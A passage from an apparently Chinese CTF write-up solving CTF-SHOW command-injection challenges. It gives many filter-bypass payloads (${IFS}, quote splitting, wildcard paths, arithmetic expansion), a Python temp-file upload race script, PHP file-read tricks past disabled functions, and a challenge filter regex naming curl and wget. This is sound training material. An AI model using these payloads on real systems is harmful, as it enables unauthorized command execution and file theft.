<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">思路一：%0a截断<br>也就是使两条语句不在一行上执行<br>c=ls%0a<br>思路二：管道符的运用<br>| 直接执行后面的语句<br>|| 如果前面执行的语句出错，则执行后面的语句<br>&amp; 如果前面的语句为假则直接执行后面的语句，前面的语句可真可假<br>&amp;&amp; 如果前面的语句为假则直接出错，不执行后面的语句<br>; 执行完前面的再执行后面的<br>c=ls || <br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220914194642233.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220914194642233.png" alt="image-20220914194642233" style="zoom:50%;"></p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220914194803436.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220914194803436.png" alt="image-20220914194803436" style="zoom:50%;"></p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220914194834018.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220914194834018.png" alt="image-20220914194834018" style="zoom:50%;"></p>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p>可以看到，过滤了cat和;</p>
<p>上面总结的继续用</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915144519587.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915144519587.png" alt="image-20220915144519587" style="zoom:50%;"></p>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p>多了个flag，不影响！</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915144848265.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915144848265.png" alt="image-20220915144848265" style="zoom:50%;"></p>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p>过滤了空格</p>
<p>再复习一下一些trick</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$&#123;IFS&#125; 但不能写作 $IFS<br>$IFS$9<br>%09<br>&lt;&gt;<br>&lt;<br>$IFS%09<br><br>payload:<br>c=tac%09fl*||<br></code></pre></td></tr></table></figure>
</li>
</ol>
<pre><code>&lt;img src=&quot;/image-20220915145105110.png&quot; alt=&quot;image-20220915145105110&quot; style=&quot;zoom:50%;&quot; /&gt;
</code></pre><ol>
<li><p>命令执行，需要严格的过滤</p>
<p>这回过滤了* $ 数字，还是可以基于上面绕过滴</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915145405097.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915145405097.png" alt="image-20220915145405097" style="zoom:50%;"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=tac&lt;fl&#x27;&#x27;ag.php||<br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p>这回是针对查看文件的命令的过滤，没啥影响</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915145702664.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915145702664.png" alt="image-20220915145702664" style="zoom:50%;"></p>
</li>
</ol>
<p>48-49. 命令执行，需要严格的过滤</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915150024647.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915150024647.png" alt="image-20220915150024647" style="zoom:50%;"></p>
<pre><code>payload1:c=nl%09fla\g.php||
payload2:c=nl%09fla\g.php%0a
payload3:c=nl%09fla&#39;&#39;g.php%0a
payload4:c=nl%09fla&quot;&quot;g.php%0a
payload5:c=vi%09fla\g.php%0a
payload6:c=tac%09fla\g.php%0a
payload7:c=uniq%09fla\g.php%0a
payload8:c=nl&lt;fla&#39;&#39;g.php||
payload9:c=nl%09fla\g.php%26
</code></pre><ol>
<li><p>命令执行，需要严格的过滤</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915150738198.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915150738198.png" alt="image-20220915150738198" style="zoom:50%;"></p>
<p>多过滤了<code>\x09 \x26</code></p>
<p>继续</p>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p>哦吼，终于把tac给过滤了，可惜还有vi和nl</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915151002392.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915151002392.png" alt="image-20220915151002392" style="zoom:50%;"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=vi&lt;fla\g.php||<br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行，需要严格的过滤</p>
<p>这关把尖括号给ban了，但是注意这关没$，这不故意的嘛</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915151318107.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915151318107.png" alt="image-20220915151318107"></p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=nl$&#123;IFS&#125;fl&#x27;&#x27;ag.php||<br></code></pre></td></tr></table></figure>
<p>然而是个假的flag，稍微找一下就知道在根目录了</p>
<ol>
<li><p>命令执行，需要严格的过滤</p>
<p>这关更换题面了，过滤的情况没啥变化</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915152010359.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915152010359.png" alt="image-20220915152010359"></p>
</li>
</ol>
<p>ls，可以看到如下几个文件，花里胡哨的整这么多文件，其实还是读flag.php</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915152140748.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915152140748.png" alt="image-20220915152140748" style="zoom:50%;"></p>
<ol>
<li><p>某位牛出的题</p>
<p>这可太秀了，相当于不能出现这些关键词序列了，可以看到里面也有nl了，不过还有其它的可以用，至于flag，占位符可以用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if(isset($_GET[&#x27;c&#x27;]))&#123;<br>    $c=$_GET[&#x27;c&#x27;];<br>    if(!preg_match(&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;, $c))&#123;<br>        system($c);<br>    &#125;<br>&#125;else&#123;<br>    highlight_file(__FILE__);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>引入两个新的输出文件信息的命令</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">paste merge corresponding or subsequent lines of files<br>rev reverse lines of a file<br></code></pre></td></tr></table></figure>
</li>
<li><p><strong>命令执行，需要严格的过滤</strong></p>
<p>这波平平无奇了属于是，直接ban掉所有字母</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915154318640.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915154318640.png" alt="image-20220915154318640" style="zoom:50%;"></p>
<p>新姿势新姿势</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">bin为binary的简写，主要放置一些系统的必备执行档例如:cat、cp、chmod df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等。<br>我们日常直接使用的cat或者ls等等都其实是简写，例如ls完整全称应该是/bin/ls<br>base64命令 Encode and decode using Base64 representation<br></code></pre></td></tr></table></figure>
<p>就是我们由于存在环境变量，所以一般命令的输入写简写就可以，但其实全路径(mac的base64命令所在目录有区别)是这样的，而我们可以使用占位符来替换掉所有字母部分的内容来加一绕过（这里的trick主要就是利用了base64命令包含数字所以可以被匹配到）</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915154809716.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915154809716.png" alt="image-20220915154809716"></p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=/???/????64 ????.???<br></code></pre></td></tr></table></figure>
<ol>
<li><p><strong>命令执行，需要严格的过滤 php特性以及shell命令执行</strong></p>
<p>直接ban掉了所有数字和字母，以及$和(这些经典trick的利用符</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915155321365.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220915155321365.png" alt="image-20220915155321365"></p>
</li>
</ol>
<p>根据P神的无数字无字母getshell，可以结合<strong>上传临时文件</strong>与<strong>shell文件命令</strong>执行来绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><br>url = <span class="hljs-string">&quot;http://240d04e7-6751-459f-8e10-2cef8ed0e801.challenge.ctf.show/?c=. /???/????????[@-[]&quot;</span><br>files = &#123;<br>    <span class="hljs-string">&quot;files&quot;</span>: (<span class="hljs-string">&quot;evil.txt&quot;</span>, <span class="hljs-string">&quot;cat flag.php&quot;</span>)<br>&#125;<br><br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    r = requests.post(url, files=files)<br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;ctfshow&quot;</span> <span class="hljs-keyword">in</span> r.text:<br>        <span class="hljs-built_in">print</span>(r.text)<br>        <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
<ol>
<li><p><strong>命令执行，需要严格的过滤</strong> <strong>shell的小trick</strong></p>
<p>我超了，过滤的更多了，这一关点号、中括号、短横、通配符也用不了了。但是这关给我们留了$符号和括号，并且题面已经帮我们写好了cat和.php，想让我们构造出数字出来</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220916171603566.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220916171603566.png" alt="image-20220916171603566"></p>
<p>这里运用到了shell的一些骚姿势</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">$(()) 代表做一次运算，因为里面为空，也表示值为0<br>$((~$(()))) 对0作取反运算，值为-1<br>$(($((~$(())))$((~$(()))))) -1-1，也就是(-1)+(-1)为-2，所以值为-2<br>$((~$(($((~$(())))$((~$(()))))))) 再对-2做一次取反得到1，所以值为1<br><br>如果对取反不了解可以百度一下，这里给个容易记得式子，如果对a按位取反，则得到的结果为-(a+1)，也就是对0取反得到-1<br></code></pre></td></tr></table></figure>
<p>所以要构造出36，我们就得先构造-37</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">payload1 = <span class="hljs-string">&quot;$((&quot;</span> + <span class="hljs-string">&quot;$((~$(())))&quot;</span>*<span class="hljs-number">37</span> + <span class="hljs-string">&quot;))&quot;</span><br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220916172852985.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220916172852985.png" alt="image-20220916172852985" style="zoom:50%;"></p>
<p>然后再对其进行取反</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">payload2 = &quot;$((~&quot; + payload1 + &quot;))&quot;<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220916173037459.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220916173037459.png" alt="image-20220916173037459" style="zoom:50%;"></p>
<p><strong>payload</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))<br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行，突破禁用函数</p>
<p>表面上看上去平平无奇可以直接蚁剑连上去</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220916184258285.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220916184258285.png" alt="image-20220916184258285" style="zoom:50%;"></p>
<p>不过考点应该不是这么搞，试一试手动的方法</p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220916184506959.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220916184506959.png" alt="image-20220916184506959" style="zoom:50%;"></p>
<p>这题主要是换成了一个代码执行函数<code>eval</code></p>
<p class='item-img' data-src='/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220916184801400.png'><img src="/2022/09/21/CTF-SHOW%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/image-20220916184801400.png" alt="image-20220916184801400"></p>
<p>首先尝试执行命令执行类函数<code>c=echo &#39;ls&#39;(反斜杠)</code>，结果报错</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">shell_exec() has been disabled for security reasons in /var/www/html/index.php(17) : eval()&#x27;d code on line 1<br></code></pre></td></tr></table></figure>
<p>类似的还有system， 也就是命令执行类函数都被禁了</p>
<p>所以函数的思路转换为读文件一类</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php">常用读文件函数<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-variable">$filename</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">php_strip_whitespace</span>(<span class="hljs-variable">$filename</span>));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$filename</span>));<br><span class="hljs-title function_ invoke__">readfile</span>(<span class="hljs-variable">$filename</span>);<br><br><span class="hljs-comment">// file — 把整个文件读入一个数组中</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$filename</span>)); <br><span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-title function_ invoke__">file</span>(<span class="hljs-variable">$filename</span>));<br><br><span class="hljs-keyword">include</span>(<span class="hljs-variable">$filename</span>); <span class="hljs-comment">// 非php代码</span><br><span class="hljs-keyword">include_once</span>(<span class="hljs-variable">$filename</span>); <span class="hljs-comment">// 非php代码</span><br><span class="hljs-keyword">require</span>(<span class="hljs-variable">$filename</span>); <span class="hljs-comment">// 非php代码</span><br><span class="hljs-keyword">require_once</span>(<span class="hljs-variable">$filename</span>); <span class="hljs-comment">// 非php代码</span><br><br><span class="hljs-comment">// fopen去读取文件内容</span><br><span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;r&quot;</span>), <span class="hljs-variable">$size</span>);<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-title function_ invoke__">popen</span>(<span class="hljs-string">&quot;cat flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>), <span class="hljs-variable">$size</span>));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;r&quot;</span>))); <span class="hljs-comment">// 读取一行</span><br><span class="hljs-title function_ invoke__">fpassthru</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;r&quot;</span>)); <span class="hljs-comment">// 从当前位置一直读取到 EOF</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">fgetcsv</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>,<span class="hljs-string">&quot;r&quot;</span>), <span class="hljs-variable">$size</span>));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">fgetss</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-string">&quot;r&quot;</span>))); <span class="hljs-comment">// 从文件指针中读取一行并过滤掉 HTML 标记</span><br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">fscanf</span>(<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>),<span class="hljs-string">&quot;%s&quot;</span>));<br><span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-title function_ invoke__">parse_ini_file</span>(<span class="hljs-variable">$filename</span>)); <span class="hljs-comment">// 失败时返回 false , 成功返回配置数组</span><br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行，突破禁用函数</p>
<p>题面一致，本来想查下phpinfo()看看禁用了哪些函数，结果phpinfo都给我禁了…</p>
<p>先查下当前目录文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">c=print_r(scandir(&#x27;.&#x27;));<br>c=print_r(scandir(dirname(&#x27;__FILE__&#x27;)));<br><br>Array ( [0] =&gt; . [1] =&gt; .. [2] =&gt; flag.php [3] =&gt; index.php )<br></code></pre></td></tr></table></figure>
<p>然后读取函数，新姿势(其实跟之前的差不多，之前的只能读取一部分)</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php">c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>)) &#123;<span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgets</span>(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$line</span>;&#125;<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>)) &#123;<span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgetc</span>(<span class="hljs-variable">$a</span>);<span class="hljs-keyword">echo</span> <span class="hljs-variable">$line</span>;&#125;<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">while</span> (!<span class="hljs-title function_ invoke__">feof</span>(<span class="hljs-variable">$a</span>)) &#123;<span class="hljs-variable">$line</span> = <span class="hljs-title function_ invoke__">fgetcsv</span>(<span class="hljs-variable">$a</span>);<span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$line</span>);&#125;<br>c=<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">fopen</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">fread</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;1000&quot;</span>);<br></code></pre></td></tr></table></figure>
</li>
<li><p>命令执行，突破禁用函数</p>
<p>题面一致</p>
<p>有个骚姿势，理论上我们是可以直接url访问flag.php的，但是因为php文件被代码执行了，我们是看不到内容的，一个思路就是复制(或者重命名)并更换文件名为不被当作代码解析的后缀名，即</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">copy</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;flag.txt&quot;</span>);  <span class="hljs-comment">// 将文件从 source 拷贝到 dest</span><br>或<br><span class="hljs-title function_ invoke__">rename</span>(<span class="hljs-string">&quot;flag.php&quot;</span>,<span class="hljs-string">&quot;flag.txt&quot;</span>);  <span class="hljs-comment">// 尝试把 oldname 重命名为 newname</span><br></code></pre></td></tr></table></figure>
</li>
</ol>
<p>61-65. 命令执行，突破禁用函数</p>
<p>题面一致，payload可以一直用<code>c=show_source(&#39;flag.php&#39;);</code></p>
<ol>
<li><p>命令执行，突破禁用函数，求你们别秀了</p>
<p>题面一致，终于</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">show_source() has been disabled for security reasons in /var/www/html/index.php(17) : eval()&#x27;d code on line 1<br></code></pre></td></tr></table></figure>
<p>然而它的同胞<code>highlight_file</code>还健在…，话说php为啥整这么多别名函数</p>
<p>有个特别的就是flag.php上的是个假的，需要重新扫一下目录，flag在根目录</p>
</li>
<li><p>命令执行，突破禁用函数，求你们别秀了</p>
